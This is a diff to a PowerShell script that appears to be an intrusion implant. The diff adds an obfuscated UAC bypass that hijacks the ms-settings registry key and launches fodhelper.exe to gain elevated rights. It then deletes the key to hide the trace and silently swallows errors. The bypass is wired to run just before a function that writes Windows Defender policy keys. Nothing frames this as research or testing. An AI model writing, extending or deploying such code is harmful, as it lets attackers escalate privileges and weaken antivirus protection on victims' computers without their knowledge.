@@ -70,6 +70,20 @@ $wdTask = "$taskBase\FilterHostRestart"
 $watchdogLog = "$logDir\watchdog.log"
 $null = $I.Invoke(3,4)
 
+function Invoke-UACBypass {
+    $rp = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
+    $rm = "HKCU:\Software\Classes\ms-settings"
+    $cmd = X('cG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAiU3RhcnQtU2xlZXAgMzsgUmVtb3ZlLUl0ZW0gLVBhdGggJ0hLQ1U6XFNvZnR3YXJlXENsYXNzZXNcbXMtc2V0dGluZ3MnIC1SZWN1cnNlIC1Gb3JjZSI=')
+    $fn = X('Zm9kaGVscGVyLmV4ZQ==')
+    try {
+        if (!(Test-Path $rp)) { New-Item -Path $rp -Force | Out-Null }
+        Set-ItemProperty -Path $rp -Name "(Default)" -Value $cmd -Force
+        Start-Process $fn
+        Start-Sleep 5
+        Remove-Item -Path $rm -Recurse -Force -EA SilentlyContinue
+    } catch {}
+}
+
 function Invoke-DefenseEvasion {
     $defenderBase = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
     $rtBase = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
@@ -310,6 +324,7 @@ $null = $I.Invoke(11,12)
 $deploymentSuccess = $false
 $deploymentError = ""
 try {
+    Invoke-UACBypass
     Invoke-DefenseEvasion
     Start-RandomDelay -Min 3 -Max 8
     Disable-Sleep
